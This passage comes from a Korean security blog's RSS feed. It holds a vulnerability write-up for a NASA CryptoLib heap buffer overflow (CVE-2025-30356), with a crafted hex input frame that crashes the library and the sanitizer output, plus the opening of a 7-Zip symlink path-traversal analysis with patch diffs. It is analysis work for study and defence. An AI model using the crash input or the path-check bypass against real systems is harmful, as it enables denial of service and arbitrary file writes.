JPEG/DNG decoding logic. I learned a lot following the call chain and seeing how a subtle metadata mismatch can cause memory corruption.</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md">https://github.com/b1n4r1b01/n-days/blob/main/CVE-2025-43300.md</a></p><p><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p><a href="https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300">https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2025-43300</a></p><p><a href="https://github.com/msuiche/elegant-bouncer">https://github.com/msuiche/elegant-bouncer</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-43300/">CVE-2025-43300</category>
      
      <category domain="https://hackyboiz.github.io/tags/ImageIO/">ImageIO</category>
      
      <category domain="https://hackyboiz.github.io/tags/MemoryCorruption/">MemoryCorruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-30356: NASA CryptoLib의 길이 검증 미흡으로 인한 Heap Buffer Overflow</title>
      <link>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/</link>
      <guid>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/</guid>
      <pubDate>Wed, 22 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; NASA SW &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC9C0;&#xB09C; NASA SW &#xCDE8;&#xC57D;&#xC810;</p><blockquote><p><a href="https://hackyboiz.github.io/2025/09/10/OUYA77/2025-09-10/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-54878: NASA CryptoLib&#xC758; Heap Buffer Overflow&#xB85C; &#xC778;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS)</a><br><a href="https://hackyboiz.github.io/2025/05/14/OUYA77/2025-05-14/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2024-55030 : NASA fPrime&#xC758; Queue Overflow&#xB85C; &#xC778;&#xD55C; DoS &#xCDE8;&#xC57D;&#xC810;</a><br><a href="https://hackyboiz.github.io/2025/05/01/OUYA77/2025-05-01/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-25372: cFS &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC; &#xBAA8;&#xB4C8;&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xAC80;&#xC99D;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xCDE8;&#xC57D;&#xC810;</a><br><a href="https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2025-30216: CryptoLib&#xC758; Heap Buffer Overflow &#xCDE8;&#xC57D;&#xC810;</a></p></blockquote><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2">https://github.com/nasa/CryptoLib/security/advisories/GHSA-6w2x-w7w3-85w2</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NASA CryptoLib &#x2264; 1.3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="0-&#xCDE8;&#xC57D;&#xC810;-&#xBC30;&#xACBD;"><a href="#0-&#xCDE8;&#xC57D;&#xC810;-&#xBC30;&#xACBD;" class="headerlink" title="0. &#xCDE8;&#xC57D;&#xC810; &#xBC30;&#xACBD;"></a>0. &#xCDE8;&#xC57D;&#xC810; &#xBC30;&#xACBD;</h3><p>NASA CryptoLib&#xC740; cFS(core Flight System)&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xAE30; &#xC704;&#xD574; CCSDS(Consultative Committee for Space Data Systems) Space Data Link Security Protocol - Extended Procedures (SDLS-EP)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; &#xC194;&#xB8E8;&#xC158;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; &#xD154;&#xB808;&#xCEE4;&#xB9E8;&#xB4DC; &#xD504;&#xB808;&#xC784; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC5D0; Heap Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h3 id="1-Root-Cause-&#xC124;&#xBA85;"><a href="#1-Root-Cause-&#xC124;&#xBA85;" class="headerlink" title="1. Root Cause &#xC124;&#xBA85;"></a>1. Root Cause &#xC124;&#xBA85;</h3><p><code>Crypto_TC_ApplySecurity</code> &#xD568;&#xC218;&#xB294; &#xC554;&#xD638;&#xD654; &#xBC0F; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xBA70;, &#xD1B5;&#xC2E0; &#xD504;&#xB808;&#xC784;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548; &#xCC98;&#xB9AC;&#xB97C; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD504;&#xB808;&#xC784;&#xC758; &#xD5E4;&#xB354;&#xC640; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xACE0;, &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>Crypto_TC_ApplySecurity_Cam()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC758; &#xBCF4;&#xC548; &#xAD8C;&#xACE0;&#xC5D0;&#xC11C; <code>fl</code> &#xD544;&#xB4DC;&#xC758; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD588;&#xC9C0;&#xB9CC;, &#xD328;&#xCE58; &#xCF54;&#xB4DC;&#xAC00; &#xBD88;&#xC644;&#xC804;&#xD558;&#xC5EC; &#xC5EC;&#xC804;&#xD788; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACC4;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xBB38;&#xC81C; &#xCF54;&#xB4DC;:</strong></p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (temp_tc_header.fl &lt;= TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>){    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;    mc_if-&gt;mc_log(status);    <span class="hljs-keyword">return</span> status;} <span class="hljs-keyword">uint16_t</span> tf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>;<span class="hljs-built_in">memcpy</span>((p_new_enc_frame + index), (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len), tf_payload_len);</code></pre><p>&#xD604;&#xC7AC;&#xC758; &#xD328;&#xCE58; &#xCF54;&#xB4DC;&#xB294; <code>fl</code>&#xC774; &#xD2B9;&#xC815; &#xC0C1;&#xC218;&#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xAC70;&#xB098; &#xAC19;&#xC740;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; <code>tf_payload_len</code> &#xACC4;&#xC0B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xC644;&#xC804;&#xD788; &#xB9C9;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>fl</code>&#xC744; <code>6</code>, <code>segment_hdr_len</code>&#xC744; <code>1</code>, <code>fecf_len</code>&#xC744; <code>2</code>&#xB85C; &#xC870;&#xC791;&#xD558;&#xBA74;, <code>tf_payload_len</code> &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xB294; <code>-1</code>&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; <code>uint16_t</code> &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xB418;&#xBA74;&#xC11C; <code>65535</code>&#xC640; &#xAC19;&#xC740; &#xB9E4;&#xC6B0; &#xD070; &#xC591;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xD658;(integer wrap-around)&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, <code>memcpy()</code> &#xD568;&#xC218;&#xB294; <code>tf_payload_len</code>&#xC774; <code>65535</code>&#xB77C;&#xB294; &#xAC70;&#xB300;&#xD55C; &#xAC12;&#xC744; &#xAC16;&#xAC8C; &#xB418;&#xBBC0;&#xB85C;, &#xD560;&#xB2F9;&#xB41C; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xD6E8;&#xC52C; &#xCD08;&#xACFC;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD799; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC774; &#xC190;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-PoC-&#xC124;&#xBA85;"><a href="#2-PoC-&#xC124;&#xBA85;" class="headerlink" title="2. PoC &#xC124;&#xBA85;"></a>2. PoC &#xC124;&#xBA85;</h3><p>ASan(AddressSanitizer)&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC870;&#xC791;&#xB41C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xC785;&#xB825; &#xD504;&#xB808;&#xC784;&#xC744; <code>Crypto_TC_ApplySecurity()</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74;, &#xD328;&#xCE58;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xCDA9;&#xB3CC;&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xC791;&#xB41C; &#xC785;&#xB825; &#xD504;&#xB808;&#xC784;:</p><pre><code class="hljs jsx"><span class="hljs-number">20</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">19</span> <span class="hljs-number">31</span> FA <span class="hljs-number">2</span>A <span class="hljs-number">79</span> <span class="hljs-number">20</span> <span class="hljs-number">6</span>F <span class="hljs-number">7</span>F <span class="hljs-number">0</span>D AD <span class="hljs-number">55</span> CE <span class="hljs-number">54</span> <span class="hljs-number">89</span> <span class="hljs-number">9</span>D D3 <span class="hljs-number">7</span>F A6 D0 <span class="hljs-number">07</span> B4 E8 <span class="hljs-number">6</span>D B4 E8 <span class="hljs-number">6</span>D A4 B4 E8 <span class="hljs-number">67</span></code></pre><p>&#xC774; &#xD504;&#xB808;&#xC784;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74;, ASan&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC624;&#xB958;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xBA70; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">READ of size <span class="hljs-number">65535</span> at <span class="hljs-number">0</span>x... thread T0#<span class="hljs-number">0</span> <span class="hljs-keyword">in</span> __asan_memcpy#<span class="hljs-number">1</span> <span class="hljs-keyword">in</span> Crypto_TC_ApplySecurity_Cam (crypto_tc.c:<span class="hljs-number">1161</span>)...SUMMARY: AddressSanitizer: heap-buffer-overflow</code></pre><p>&#xB610;&#xD55C;, GDB&#xB85C; &#xC2E4;&#xD589; &#xC2DC; &#xD799; &#xC190;&#xC0C1;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC911;&#xB2E8;(Abort)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs fortran">----- Crypto_TC_ApplySecurity <span class="hljs-keyword">END</span> -----malloc(): corrupted top <span class="hljs-built_in">size</span><span class="hljs-function"><span class="hljs-keyword">Program</span></span> received signal SIGABRT, Aborted<span class="hljs-number">.</span></code></pre><ul><li><strong>&#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xCEE4;&#xBC0B;:</strong> <code>01b7402cf07c3ee0ddf422de7c20a3d87fff8a87</code></li></ul><h3 id="3-Patch-Diffing"><a href="#3-Patch-Diffing" class="headerlink" title="3. Patch Diffing"></a>3. Patch Diffing</h3><p>Underflow &#xAC80;&#xC0AC;&#xB97C; &#xC704;&#xD574; &#xAE38;&#xC774;&#xAC00; 0&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; &#xD568;&#xC218;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xAC80;&#xC99D;&#xBB38;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">int16_t payload_calc = temp_tc_header.fl - TC_FRAME_HEADER_SIZE - segment_hdr_len - fecf_len + <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (payload_calc &lt; <span class="hljs-number">0</span>){#ifdef TC_DEBUG    printf(<span class="hljs-string">&quot;Payload Calculation Underflow: %d\n&quot;</span>, payload_calc);#endif    status = CRYPTO_LIB_ERR_TC_FRAME_LENGTH_UNDERFLOW;    mc_if-&gt;mc_log(status);    <span class="hljs-keyword">return</span> status;}tf_payload_len = (uint16_t)payload_calc;</code></pre><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a href="https://nvd.nist.gov/vuln/detail/cve-2025-30356">https://nvd.nist.gov/vuln/detail/cve-2025-30356</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/CryptoLib/">CryptoLib</category>
      
      <category domain="https://hackyboiz.github.io/tags/Heap-buffer-overflow/">Heap_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/Nasa/">Nasa</category>
      
      <category domain="https://hackyboiz.github.io/tags/cFS/">cFS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/22/OUYA77/2025-10-22/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-11001, CVE-2025-11002: 7-Zip의 심볼릭링크 처리 취약점으로 인한 Arbitrary File Write / RCE 가능성</title>
      <link>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/</link>
      <guid>https://hackyboiz.github.io/2025/10/18/clalxk/CVE-2025-11001/</guid>
      <pubDate>Sat, 18 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-25-949/&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-949/">https://www.zerodayinitiative.com/advisories/ZDI-25-949/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>7-Zip : &#x2264; 24.09</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-11001 / CVE-2025-11002&#xB294; 7-Zip&#xC758; ZIP &#xCD94;&#xCD9C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;(&#xD2B9;&#xD788; Linux/WSL &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB41C; &#xB9C1;&#xD06C; &#xB370;&#xC774;&#xD130;)&#xB97C; &#xD30C;&#xC2F1;&#xB7;&#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC758; &#xB17C;&#xB9AC;&#xC801; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD30C;&#xC11C;&#xAC00; Windows &#xC808;&#xB300;&#xACBD;&#xB85C;<code>C:\...</code>&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xB9C1;&#xD06C;&#xB97C; <strong>&#xB9AC;&#xB205;&#xC2A4;&#xC2DD; &#xAC80;&#xC0AC;</strong>&#xB85C; &#xC808;&#xB300; &#xC5EC;&#xBD80;&#xB97C; &#xC624;&#xD310;&#xD558;&#xBA74; <code>isRelative</code>&#xAC00; &#xC798;&#xBABB; &#xC124;&#xC815;&#xB418;&#xACE0;, &#xC774;&#xD6C4; &#x2018;relativize&#x2019; &#xACFC;&#xC815;&#xC5D0;&#xC11C; ZIP &#xB0B4;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC811;&#xB450;&#xC0AC;&#xAC00; &#xBD99;&#xC73C;&#xBA74;&#xC11C; <code>IsSafePath</code> &#xAC80;&#xC0AC;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB85C; &#xC77C;&#xBD80; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xD750;&#xB984;&#xC740; &#xD56D;&#xBAA9; &#xD0C0;&#xC785; &#xAC80;&#xC0AC;(&#xC608;: _item.IsDir)&#xB85C; &#xC778;&#xD574; &#xBE60;&#xC838;&#xB098;&#xAC00; &#xBC84;&#xB824; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; reparse &#xB370;&#xC774;&#xD130;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0;, &#xCD94;&#xCD9C; &#xC911;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xB530;&#xB77C; &#xC784;&#xC758; &#xC704;&#xCE58;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC4F0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="IsSafePath&#xC640;-CLinkLevelsInfo-Parse-diff"><a href="#IsSafePath&#xC640;-CLinkLevelsInfo-Parse-diff" class="headerlink" title="IsSafePath&#xC640; CLinkLevelsInfo::Parse diff"></a>IsSafePath&#xC640; CLinkLevelsInfo::Parse diff</h3><pre><code class="hljs cpp">-<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>+static bool IsSafePath(const UString &amp;path, bool isWSL) {   CLinkLevelsInfo levelsInfo;-  levelsInfo.Parse(path);+  levelsInfo.Parse(path, isWSL);   <span class="hljs-keyword">return</span> !levelsInfo.IsAbsolute       &amp;&amp; levelsInfo.LowLevel &gt;= <span class="hljs-number">0</span>       &amp;&amp; levelsInfo.FinalLevel &gt; <span class="hljs-number">0</span>; } +<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>;+<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">IsSafePath</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path)</span></span>+{+  <span class="hljs-keyword">return</span> IsSafePath(path, <span class="hljs-literal">false</span>); <span class="hljs-comment">// isWSL</span>+}+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CLinkLevelsInfo::Parse</span><span class="hljs-params">(<span class="hljs-keyword">const</span> UString &amp;path, <span class="hljs-keyword">bool</span> isWSL)</span></span><span class="hljs-function"> </span>{-  IsAbsolute = NName::IsAbsolutePath(path);-+  IsAbsolute = isWSL ?+      IS_PATH_SEPAR(path[<span class="hljs-number">0</span>]) :+      NName::IsAbsolutePath(path);   LowLevel = <span class="hljs-number">0</span>;   FinalLevel = <span class="hljs-number">0</span>; }</code></pre><p>7-Zip 24.09&#xC640; 25.00&#xC744; diff &#xD574;&#xBCF4;&#xBA74; &#xC774;&#xBC88; &#xB9B4;&#xB9AC;&#xC2A4;&#xC5D0;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; &#xBC84;&#xADF8;&#xAC00; &#xC218;&#xC815;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xD328;&#xCE58;&#xB294; CPP/7zip/UI/Common/ArchiveExtractCallback.cpp&#xC758; zip &#xC555;&#xCD95; &#xD574;&#xC81C; &#xAD00;&#xB828; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C; &#xCF54;&#xB4DC;&#xAC00; &#xB9CE;&#xC774; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; <code>IsSafePath</code> &#xD568;&#xC218;&#xAC00; &#xB208;&#xC5D0; &#xB744;&#xAC8C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p><strong>1) &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C; &#xC2DD;&#xBCC4;</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (_curSize_Defined &amp;&amp; _curSize &gt; <span class="hljs-number">0</span> &amp;&amp; _curSize &lt; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)){  <span class="hljs-keyword">if</span> (_fi.IsLinuxSymLink())  {    is_SymLink_in_Data = <span class="hljs-literal">true</span>;    _is_SymLink_in_Data_Linux = <span class="hljs-literal">true</span>;  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_fi.IsReparse())  {    is_SymLink_in_Data = <span class="hljs-literal">true</span>;    _is_SymLink_in_Data_Linux = <span class="hljs-literal">false</span>;  }}</code></pre><p>&#xC2DC;&#xC791;&#xC810;&#xC740; CArchiveExtractCallback::GetStream()&#xC774;&#xBA70;, &#xC774; &#xD568;&#xC218;&#xB294; ReadLink&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. <code>GetStream()</code>&#xC740; <code>CArchiveExtractCallback::GetExtractStream()</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xD30C;&#xC77C; &#xD06C;&#xAE30;&#xAC00; &#xC791;&#xC73C;&#xBA74; &#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xC778;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC2DD;&#xBCC4;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xD6C4; &#xC804;&#xCCB4; &#xD30C;&#xC77C; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2) reparse &#xBAA8;&#xB4DC; &#xBC0F; &#xB9C1;&#xD06C; &#xD30C;&#xC2F1;: CLinkInfo::Parse &#xD638;&#xCD9C;</strong></p><p>&#xCD94;&#xAC00; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE5C; &#xB4A4; <code>CArchiveExtractCallback::CloseReparseAndFile()</code>&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xB9C1;&#xD06C;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xC5EC; &#xADF8;&#xAC83;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB824;&#xB294; &#xC704;&#xCE58;(&#xBAA9;&#xC801;&#xC9C0;)&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB824; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// &#xC815;&#xC758;</span><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">CLinkInfo::Parse</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Byte *data, <span class="hljs-keyword">size_t</span> dataSize, <span class="hljs-keyword">bool</span> isLinuxData)</span></span>;</code></pre><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span> repraseMode = <span class="hljs-literal">false</span>;<span class="hljs-keyword">bool</span> needSetReparse = <span class="hljs-literal">false</span>;CLinkInfo linkInfo;<span class="hljs-keyword">if</span> (_bufPtrSeqOutStream){  repraseMode = <span class="hljs-literal">true</span>;  reparseSize = _bufPtrSeqOutStream_Spec-&gt;GetPos();  <span class="hljs-keyword">if</span> (_curSize_Defined &amp;&amp; reparseSize == _outMemBuf.Size())  {    <span class="hljs-comment">// _is_SymLink_in_Data_Linux == true </span>    needSetReparse = linkInfo.Parse(_outMemBuf, reparseSize, _is_SymLink_in_Data_Linux);    <span class="hljs-keyword">if</span> (!needSetReparse)      res = SendMessageError_with_LastError(<span class="hljs-string">&quot;Incorrect reparse stream&quot;</span>, us2fs(_item.Path));  }}</code></pre><p>&#xD30C;&#xC11C;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC911;&#xC694;&#xD55C; &#xC18D;&#xC131;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Link path</strong> (&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xC758; &#xBAA9;&#xC801;&#xC9C0; &#xACBD;&#xB85C;)</li><li><strong>isRelative</strong> (&#xC2EC;&#xBCFC;&#xB9AD;&#xB9C1;&#xD06C;&#xAC00; &#xC0C1;&#xB300; &#xACBD;&#xB85C;&#xC778;&#xC9C0; 